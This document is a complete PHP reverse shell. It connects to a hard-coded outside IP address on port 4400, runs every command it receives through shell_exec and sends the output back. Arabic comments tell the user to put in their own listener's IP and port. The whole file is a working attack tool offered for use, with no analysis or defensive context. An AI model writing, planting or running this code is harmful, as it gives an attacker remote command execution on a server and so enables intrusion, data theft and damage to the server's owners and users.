<?php
set_time_limit(0);
$ip = '37.49.226.56';  // استبدل YOUR_IP بعنوان IP الخاص بك
$port = 4400; // استبدل YOUR_PORT بالمنفذ الذي تستمع عليه
$sock = fsockopen($ip, $port);
if ($sock) {
    while ($data = fgets($sock)) {
        $output = shell_exec($data);
        fwrite($sock, $output);
    }
    fclose($sock);
}
?>
